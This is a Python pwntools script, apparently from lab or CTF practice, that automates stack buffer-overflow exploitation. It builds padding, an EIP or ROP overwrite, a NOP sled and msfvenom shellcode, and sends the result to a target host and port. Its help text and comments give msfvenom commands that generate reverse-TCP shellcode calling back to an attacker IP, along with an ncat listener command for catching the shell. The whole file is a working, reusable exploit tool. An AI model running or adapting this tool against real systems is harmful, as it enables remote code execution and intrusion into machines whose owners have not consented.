#!/usr/bin/env python3

import argparse
from math import ceil
from pwn import *
from elftools.common.exceptions import ELFError

parser = argparse.ArgumentParser(
  formatter_class=argparse.RawDescriptionHelpFormatter,
  description="""Exploit buffer overflows.""", 
  epilog="""
Create custom shellcode and save to shellcode.py
(must be formatted buf = b'\\x90\\x90\\x90\\x90...')

  $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f python -a x86 -b "\\x00\\x09\\x0a\\x0d\\xff" > shellcode.py

Listen for shell

  $ ncat -lvp 4444

Run exploit

  $ ./exploit.py -H 10.10.76.237 -p 31337 --sf $'\\n' -o 146 -e '0x080414c3'
""")
parser.add_argument('-H','--host', help='Target host')
parser.add_argument('-p','--port', help='Target port')
parser.add_argument('-o','--offset', help='EIP offset', required=True, type=int)

parser.add_argument('-e','--eip', help='Value to overwrite EIP with or ROP chain. Ie. 0x01010101,0x02020202,0x03030303')
parser.add_argument('-b','--bin', help='Target binary to extract gadgets from. Only ELF!!')

parser.add_argument('-s','--size', help='Payload size', default=-1, type=int)
parser.add_argument('-sf','--suffix', help='Payload suffix, Ie. USER ', default='')
parser.add_argument('-pf','--prefix', help="Payload prefix, Ie. \\n", default='')
parser.add_argument('-a','--arch', help='Target architecture. Ie. x86 or amd64', default='x86')
parser.add_argument('-O','--os', help='Target OS. Ie. windows or linux', default='linux')
parser.add_argument('-d','--dry', help='Dry run. Print would be paylad.', action="store_true")
parser.add_argument('-v','--debug', help='Show debug information', action="store_true")

args = parser.parse_args()

# Save msfvenom output formated as python to shellcode.py in curent dir
# msfvenom -p windows/shell/reverse_tcp LHOST=10.18.97.196 LPORT=4444 \
# -f python -a x86 -b "\x00\x09\x0a\x0d\xff" > shellcode.py
try:
  from shellcode import buf as shellcode
except ModuleNotFoundError as e:
  parser.error("""Shellcode not present. Create it at shellcode.py
  
  msfvenom -p windows/shell/reverse_tcp ... -f python -a x86 > shellcode.py
  """)

if ( not args.eip and not args.bin ):
  parser.error('Either -e/--eip or -b/--bin is required.')

log_level = 'info'
if (args.debug):
  log_level = 'debug'

context(log_level = log_level, arch= args.arch, os = args.os)

elf = None
binary = None
if (args.bin):
  try:
    context.binary = binary = ELF(args.bin)
  except ELFError as e:
    parser.error('-b/--bin only supports ELF binaries.')

  rop = ROP(binary)

args.prefix = bytes(args.prefix, 'utf-8')
args.suffix = bytes(args.suffix, 'utf-8')

if (args.eip):
  args.eip = b"".join( [ pack(int(addr, 16)) for addr in args.eip.split(',') ] )
else:
  args.eip = pack(rop.esp.address)

if (args.offset < len(args.prefix)):
  parser.error("-pf/--prefix length is bigger than -o/--offset, it would override EIP.")

used_size = args.offset + len(args.eip) + len(shellcode) + len(args.suffix) 

if (args.size == -1):
  args.size = ceil( used_size / 100) * 100

if (args.size < used_size):
  parser.error( f"Increase -s/--size. Can't fit useful payload of size {used_size} into size {args.size}.")

if args.host is not None and args.port is not None:
  if not args.dry:
    c = remote(args.host, args.port)
elif binary is not None:
    c = process(binary)
else:
    parser.error("Set remote -H/--host and -p/--port and/or local binary -b/--bin.")

log.info(f"Shellcode size {len(shellcode)}")
log.info(f"Useful size (offset + ROP + shellcode + suffix) {used_size}")

padding = b"\x90" * (args.offset - len(args.prefix))
nopsled = b"\x90" * (args.size - used_size)

payload = padding + args.eip + nopsled + shellcode 
payload = args.prefix + payload + args.suffix

log.info(f"Payload size {len(payload)}")

log.info("Sending payload")

if (args.dry):
  print(payload)
else:
  c.send(payload)
  c.settimeout(3)
  log.info("Listening for response")
  out = c.recv(1024)
  print(out)

log.info("Done")
